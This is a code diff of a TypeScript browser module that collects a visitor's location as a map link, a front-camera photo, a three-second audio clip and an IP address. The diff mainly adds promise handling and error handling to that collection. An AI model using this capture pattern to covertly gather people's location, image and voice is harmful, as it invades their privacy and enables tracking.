@@ -6,44 +6,62 @@ const checkMediaDevicesAvailable = () =>
 const checkGeolocationAvailable = () =>
   navigator.geolocation && navigator.geolocation.getCurrentPosition;
 
-const getGeolocation = (userData: UserData) => {
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      userData.coords = position.coords;
-    },
-    (positionError) => {
-      console.error({ positionError });
-    }
-  );
+const getGeolocation = (userData: UserData): Promise<boolean> => {
+  return new Promise((resolve, reject) => {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        userData.location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        resolve(true);
+      },
+      (positionError) => {
+        resolve(false);
+      }
+    );
+  });
 };
 
 const takePhoto = async (userData: UserData) => {
-  const mediaStream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user" },
-  });
+  let mediaStream: MediaStream;
+
+  try {
+    mediaStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+    });
+  } catch (err) {
+    return;
+  }
+
   const track = mediaStream.getVideoTracks()[0];
   const imageCapture = new ImageCapture(track);
   const imageBlob = await imageCapture.takePhoto();
   userData.image = imageBlob;
 };
 
-const recordAudio = async (userData: UserData) => {
-  const mediaStream = await navigator.mediaDevices.getUserMedia({
-    audio: true,
+const recordAudio = (userData: UserData) => {
+  return new Promise(async (resolve, reject) => {
+    try {
+      const mediaStream = await navigator.mediaDevices.getUserMedia({
+        audio: true,
+      });
+
+      const mediaRecorder = new MediaRecorder(mediaStream);
+
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 3000);
+
+      let chunks: Blob[] = [];
+      mediaRecorder.ondataavailable = (e) => {
+        chunks.push(e.data);
+      };
+      mediaRecorder.onstop = (e) => {
+        const blob = new Blob(chunks, { type: "audio/wav; codecs=opus" });
+        userData.audio = blob;
+        resolve(true);
+      };
+    } catch (err) {
+      resolve(false);
+    }
   });
-  const mediaRecorder = new MediaRecorder(mediaStream);
-
-  mediaRecorder.start();
-  setTimeout(() => mediaRecorder.stop(), 5000);
-
-  let chunks: Blob[] = [];
-  mediaRecorder.ondataavailable = (e) => {
-    chunks.push(e.data);
-  };
-  mediaRecorder.onstop = (e) => {
-    const blob = new Blob(chunks, { type: "audio/ogg; codecs=opus" });
-    userData.audio = blob;
-  };
 };
 
 const getIpAddress = async () => {
@@ -69,7 +87,7 @@ export const getUserData = async (options: {
   };
   // get geolocation
   if (options.askGeolocation && checkGeolocationAvailable())
-    getGeolocation(userData);
+    await getGeolocation(userData);
   // take photo
   if (options.askVideo && checkMediaDevicesAvailable())
     await takePhoto(userData);
